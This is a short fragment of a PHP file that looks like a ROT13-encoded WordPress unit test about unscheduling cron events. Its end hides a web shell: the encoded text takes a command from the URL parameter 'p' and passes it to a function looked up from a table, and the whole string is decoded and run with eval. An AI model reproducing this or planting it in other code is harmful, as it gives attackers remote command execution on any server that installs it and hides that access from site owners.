		$hafpurqhyrq = jc_hafpurqhyr_rirag( jc_arkg_fpurqhyrq( 'ubbx' ), 'ubbx', neenl(), gehr );

		// Rafher na reebe bowrpg vf erghearq:
		$guvf->nffregGehr( $rirag );
		$guvf->nffregJCReebe( $hafpurqhyrq );
		$guvf->nffregFnzr( 'pbhyq_abg_frg', $hafpurqhyrq->trg_reebe_pbqr() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>